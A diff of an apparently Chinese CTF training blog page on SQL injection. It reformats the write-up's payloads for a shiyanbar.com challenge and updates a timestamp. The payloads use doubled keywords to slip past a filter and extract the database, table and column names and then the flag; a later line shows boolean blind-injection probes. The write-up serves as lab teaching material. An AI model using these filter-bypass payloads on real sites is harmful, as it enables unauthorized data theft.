@@ -53,7 +53,7 @@
 <meta property="og:image" content="http://t1.aixinxi.net/o_1c99mffn1guuqnpdo1qcktkka.png-j.jpg">
 <meta property="og:image" content="http://t1.aixinxi.net/o_1c99mfu0a14io1vjh1ltr1ikvekja.png-j.jpg">
 <meta property="og:image" content="http://t1.aixinxi.net/o_1c99mn9g51v86224ndl35d14bma.png-j.jpg">
-<meta property="og:updated_time" content="2018-07-24T12:46:18.269Z">
+<meta property="og:updated_time" content="2018-07-25T03:51:18.068Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WEB集训（二）">
 <meta name="twitter:description" content="今天学姐复习了前天的数字型和字符型注入，讲了SQL注入中可能出现的过滤以及绕过的方式，以及布尔型盲注和时间型盲注。">
@@ -363,13 +363,17 @@
 <p><img src="https://t1.aixinxi.net/o_1chip6apt2j1u5p1je91ii51uf8a.png-j.jpg" alt="过滤了很多东西"></p>
 <h1 id="实验吧简单的sql注入"><a href="#实验吧简单的sql注入" class="headerlink" title="实验吧简单的sql注入"></a>实验吧简单的sql注入</h1><h2 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h2><p>通过注入获得flag值（提交格式：flag{}）。<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="noopener">解题链接</a></p>
 <p>这里过滤了很多关键字，需要尝试多次以后才能构造出正确的payload。以下为每一步的payload。</p>
-<p>获取库名：<code>&#39; unionunion  selectselect  database() &#39;</code></p>
+<p>获取库名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' unionunion  selectselect  database() '</span><br></pre></td></tr></table></figure>
 <p><img src="https://t1.aixinxi.net/o_1cj64kd27k8pjsv1ajp1q311ccea.png-j.jpg" alt="获取库名"></p>
-<p>获取表名：<code>&#39;  unionunion  selectselect  table_name  fromfrom  information_schema.tables  wherewhere  table_table_schemaschema=&#39;web1</code></p>
+<p>获取表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'  unionunion  selectselect  table_name  fromfrom  information_schema.tables  wherewhere  table_table_schemaschema='web1</span><br></pre></td></tr></table></figure>
 <p><img src="https://t1.aixinxi.net/o_1cj64lpotlok8q1no614i31ijda.png-j.jpg" alt="获取表名"></p>
-<p>获取列名：<code>&#39; unionunion  selectselect  column_namcolumn_namee  fromfrom  information_schema.coluinformation_schema.columnsmns  wherewhere  table_table_schemaschema=&#39;web1&#39; andand  table_name=&#39;flag</code></p>
+<p>获取列名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' unionunion  selectselect  column_namcolumn_namee  fromfrom  information_schema.coluinformation_schema.columnsmns  wherewhere  table_table_schemaschema='web1' andand  table_name='flag</span><br></pre></td></tr></table></figure>
 <p><img src="https://t1.aixinxi.net/o_1cj64ksn01pkkrnu1gu0c5059na.png-j.jpg" alt="获取列名"></p>
-<p>得到flag：<code>&#39; unionunion  selectselect  flag  fromfrom  web1.flag wherewhere  &#39;1&#39;=&#39;1</code></p>
+<p>得到flag：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' unionunion  selectselect  flag  fromfrom  web1.flag wherewhere  '1'='1</span><br></pre></td></tr></table></figure>
 <p><img src="https://t1.aixinxi.net/o_1cj64lcree8i1tu2jf01ft58o8a.png-j.jpg" alt="得到flag"></p>
 <h1 id="简单的sql注入3"><a href="#简单的sql注入3" class="headerlink" title="简单的sql注入3"></a>简单的sql注入3</h1><p>mysql报错注入<br>格式：flag{}<br><a href="http://ctf5.shiyanbar.com/web/index_3.php" target="_blank" rel="noopener">解题链接</a></p>
 <p>依次输入<code>1 and 1=1</code>和<code>1 and 1=2</code>，发现存在布尔盲注。</p>
